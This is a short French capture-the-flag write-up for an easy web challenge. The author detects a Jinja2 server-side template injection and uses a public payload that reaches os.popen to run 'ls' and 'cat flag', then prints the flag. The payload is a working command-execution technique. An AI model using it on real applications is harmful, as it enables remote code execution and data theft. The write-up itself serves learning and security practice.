

# Jungle Templating



- Category: `Web`
- Points: `100` => `100`
- Difficulty: Easy
- Solves: `293`


**Description**

>Challenge link : http://206.189.236.145:5000/
>N.B: There is no need to bruteforce anything.
>
> Auteur : Typhlos#9037
>

**Note**
-J'ai raté le first blood de ce challenge de peu en le flaggant en 4ème :( 

**Attachments**

- [`capture-reseau.pcapng`](https://drive.google.com/drive/folders/1MMs6CiIiBnEYUCaJyMGQqijCeW4oVdZj)

### :book: Introduction

**Overview**
 
Le site possède une unique fonctionnalité: 
  - Permettre de renter un nom
  - Retourner Hi, nom

Je pense tout de suite a une SSTI est de fait si on donne comme nom {{1+1}} le site nous retourne Hi, 2


**Exploit**

On peut voir dans le code source que c'est un serveur python donc c'est une  SSTI avec Jinja2. Je vais chercher
internet un payload permettant d'executer des commandes bash. Merci a default de Root-Me pour son payload:
```{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('lacommande').read() }} ```

Grace a cette commande je commence par faire un ls et le serveur me retourne __pycache__ app.py flag. Après 
un effort mental considérable je déduis que le fichier qui nous intéresse et le fichier flag et je fait
```{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat flag').read() }} ```
pour que le serveur me retourne le flag:


BDSEC{Y3Y_7H1515_7H3_F146}





